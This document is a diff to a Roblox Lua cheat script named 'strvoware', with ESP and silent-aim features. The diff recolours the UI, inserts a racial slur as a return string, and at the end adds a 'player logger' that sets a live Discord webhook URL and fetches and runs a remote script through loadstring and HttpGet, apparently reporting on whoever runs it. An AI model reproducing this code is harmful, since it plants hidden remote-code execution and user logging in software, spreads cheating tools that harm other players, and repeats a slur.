@@ -1,3 +1,51 @@
+function Notify(...)
+    V1 = {...};
+    spawn(function()
+        V2 = game.CoreGui:FindFirstChild("Notification");
+        if V2 then
+            V2:Destroy();
+        end
+        
+        V3 = Instance.new("ScreenGui");
+        V3.Name = "Notification";
+        V3.Parent = game.CoreGui;
+
+        if protect_gui then
+            protect_gui(V3);
+        end
+        
+        V4 = Instance.new("TextLabel", V3);
+        V4.Text = V1[1];
+        V4.Size = UDim2.new(0, 200, 0, 50);
+        V4.Position = UDim2.new(0.5, -100, 1, -50);
+        V4.BackgroundColor3 = Color3.fromRGB(30, 30, 30);
+        V4.TextColor3 = Color3.new(1, 1, 1);
+        V4.BackgroundTransparency = 0.2;
+
+        Instance.new("UICorner", V4).CornerRadius = UDim.new(0, 6);
+        cloneref(game:GetService("TweenService")):Create(
+            V4,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Position = UDim2.new(0.5, -100, 0.9, -25)}
+        ):Play();
+
+        wait(V1[2]);
+        V3:Destroy();
+    end);
+end;
+
+function Sound(...)
+    V1 = {...};
+    V2 = Instance.new("Sound");
+    V2.SoundId = "rbxassetid://" .. V1[1];
+    V2.Parent = game.CoreGui;
+    V2.Volume = V1[2];
+    V2:Play();
+end;
+
+Sound(4810729995, 0.4)
+  task.wait(5)
+Notify("loaded!", 10)
 
 local inputService   = game:GetService("UserInputService")
 local runService     = game:GetService("RunService")
@@ -9,7 +57,7 @@ local mouse          = localPlayer:GetMouse()
 local strvo           = game:GetObjects("rbxassetid://12705540680")[1]
 strvo.bg.Position     = UDim2.new(0.5,-strvo.bg.Size.X.Offset/2,0.5,-strvo.bg.Size.Y.Offset/2)
 strvo.Parent          = game:GetService("CoreGui")
-strvo.bg.pre.Text = '<font color="#FF0001">strvoware - Version 1.8</font>'
+strvo.bg.pre.Text = '<font color="#FFFFFF">strvoware - Version 1.8</font>'
 
 local library = {cheatname = "";ext = "";gamename = "";colorpicking = false;tabbuttons = {};tabs = {};options = {};flags = {};scrolling = false;notifyText = Drawing.new("Text");playing = false;multiZindex = 200;toInvis = {};libColor = Color3.fromRGB(69, 23, 255);disabledcolor = Color3.fromRGB(233, 0, 0);blacklisted = {Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.UserInputType.MouseMovement}}
 
@@ -798,7 +846,7 @@ function library:addTab(name)
                 if scrolling or library.scrolling or not newTab.Visible or library.colorpicking then return end
                 while inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and strvo.Enabled do runService.RenderStepped:Wait()
                     library.scrolling = true
-                    valuetext.TextColor3 = Color3.fromRGB(255,255,255)
+                    valuetext.TextColor3 = Color3.fromRGB(225,5,5)
 					scrolling = true
 					local value = args.min + ((mouse.X - button.AbsolutePosition.X) / button.AbsoluteSize.X) * (args.max - args.min)
 					if value < 0 then value = 0 end
@@ -807,7 +855,7 @@ function library:addTab(name)
 					updateValue(math.floor(value))
                 end
                 if scrolling and not entered then
-                    valuetext.TextColor3 = Color3.fromRGB(255,255,255)
+                    valuetext.TextColor3 = Color3.fromRGB(5,5,5)
                 end
                 if not strvo.Enabled then
                     entered = false
@@ -876,7 +924,7 @@ function library:addTab(name)
             main.BorderColor3 = Color3.fromRGB(60, 60, 60)
             main.Size = UDim2.new(1, 0, 1, 0)
             main.CanvasSize = UDim2.new(0, 0, 0, 0)
-            main.ScrollBarThickness = 0
+            main.ScrollBarThickness = 1
 
             box.Name = "box"
             box.Parent = main
@@ -985,7 +1033,7 @@ function library:addTab(name)
             main.BorderColor3 = Color3.fromRGB(60, 60, 60)
             main.Size = UDim2.new(1, 0, 1, 0)
             main.CanvasSize = UDim2.new(0, 0, 0, 0)
-            main.ScrollBarThickness = 0
+            main.ScrollBarThickness = 1
 
             button.Name = "button"
             button.Parent = main
@@ -1229,7 +1277,7 @@ function library:addTab(name)
             holder.Size = UDim2.new(1, 0, 1, 0)
             holder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
             holder.CanvasSize = UDim2.new(0, 0, 0, 0)
-            holder.ScrollBarThickness = 0
+            holder.ScrollBarThickness = 1
             holder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
             holder.AutomaticCanvasSize = Enum.AutomaticSize.Y
             holder.ScrollingEnabled = true
@@ -1271,7 +1319,7 @@ function library:addTab(name)
                     if v.text.Text == library.flags[args.flag] then
                         v.text.TextColor3 = library.libColor
                     else
-                        v.text.TextColor3 = Color3.fromRGB(255,255,255)
+                        v.text.TextColor3 = Color3.fromRGB(2,255,5)
                     end
                 end
                 if library.flags[args.flag] then
@@ -1826,7 +1874,7 @@ do --// ESP
 
     Flags.HighlightFillTransparency = 1;
     Flags.HighlightOutlineTransparency = 0;
-    Flags.HighlightFillColor    = Color3.fromRGB(100, 95, 192);
+    Flags.HighlightFillColor    = Color3.fromRGB(225, 140, 12);
     Flags.HighlightOutlineColor = Color3.fromRGB(255, 255, 255);
 
     Flags.BoxColor     = Color3.fromRGB(100, 95, 192);
@@ -2224,7 +2272,7 @@ do --// Player Functions
             end;
         end;
 
-        return nil, "None"
+        return nil, "NIGGer"
     end;
 
     function PlayerFunctions:GetHealth()
@@ -2374,7 +2422,7 @@ do --// Player Functions
                         Name.Text     = PlayerName;
                         Name.Position = TopOffset + Vector2.new(0, TopBounds);
                         Name.Color    = Flags.TextColor;
-                        TopBounds = TopBounds - 14;
+                        TopBounds = TopBounds - 15;
                     else 
                         Name.Visible = false;
                     end; 
@@ -2502,16 +2550,7 @@ do --// Player Functions
 end;
 
 do --// Visuals functions
-    VisualsModule.ESPCache = {};
-    VisualsModule.Hitmarkers = {}; 
-    function VisualsModule:FloorVector(Vector)
-		if typeof(Vector) == "Vector2" then 
-			return Vector2.new(math.floor(Vector.X), math.floor(Vector.Y));
-		else 
-			return Vector3.new(math.floor(Vector.X), math.floor(Vector.Y), math.floor(Vector.Z));
-		end;
-	end;
-
+    
     function VisualsModule:Draw(Class, Properties)
         local NewDrawing = Drawing.new(Class);
         task.spawn(function()
@@ -2528,7 +2567,7 @@ do --// Visuals functions
         local TextLabel = VisualsModule:Draw("Text", {
             Text = "",
             Font = 2,
-            Size = 13,
+            Size = 15,
             Outline = true,
             Center = true,
             Color = Color3.new(1, 1, 1);
@@ -2622,7 +2661,7 @@ do --// Visuals functions
             Position = Position;
             Drawings = {
                 [1] = VisualsModule:Draw("Line", {
-                    Thickness = 1.5,
+                    Thickness = 1.5 ,
                     ZIndex = 9000,
                     Color = Flags.HitmarkerColor,
                 }),
@@ -2846,7 +2885,7 @@ espSection:addToggle({
     default = true,
     callback = function(value)
         Flags.ESPHealthbar = value
-        --Notifications:New("Healthbar ESP has been set to " .. tostring(value), 3)
+        
     end
 })
 
@@ -2928,11 +2967,10 @@ function Silent()
             Character.LeftHand,
             Character.RightHand
         }
-        
-        -- Choose a random root part from the list
+         --strvo HAS to be the best
         local randomRootPart = rootPartsList[math.random(1, #rootPartsList)]
         
-        -- Check if the selected root part is valid before using its velocity
+        -- Check if the selected root part is k before using its velocity
         if randomRootPart and randomRootPart:IsA("BasePart") then
             if randomRootPart.Velocity.Y < -20 then 
                 Prediction = TargetCF.Position + Vector3.new(randomRootPart.Velocity.X, (randomRootPart.Velocity.Y * 0.3), randomRootPart.Velocity.Z) * silent.pred
@@ -2984,7 +3022,7 @@ NotificationBindable.OnInvoke = callback
 game.StarterGui:SetCore("SendNotification", {
     Title = "strvoware";
     Text = "you are a free user";
-    Duration = "10";
+    Duration = "60";
     Callback = NotificationBindable;
 })
    
@@ -2998,7 +3036,7 @@ NotificationBindable.OnInvoke = callback
 game.StarterGui:SetCore("SendNotification", {
     Title = "strvoware";
     Text = " s@ strvo.";
-    Duration = "10";
+    Duration = "60";
     Callback = NotificationBindable;
 })
 
@@ -3011,7 +3049,21 @@ NotificationBindable.OnInvoke = callback
 game.StarterGui:SetCore("SendNotification", {
     Title = "strvoware";
     Text = " RAGEEEEEEEE";
-    Duration = "25";
+    Duration = "60";
     Callback = NotificationBindable;
 })
-   
+--player logger 7-10-24
+getgenv().Title = "strvoware"
+getgenv().ThumbnailUrl = ""
+getgenv().Color = 0x000000 -- Black
+
+getgenv().FieldTitle = "strvoware"
+getgenv().FieldText = "heh.."
+
+getgenv().FooterText = "strvoware"
+getgenv().FooterUrl = ""
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1260809458523570267/uRbBSpAZWMuN_APoQlvNCO7oNtgJ_i1k_B1SaabWHa2IGwZBj0P_DhdY8bSaZJ3GETd-"
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
+end)()
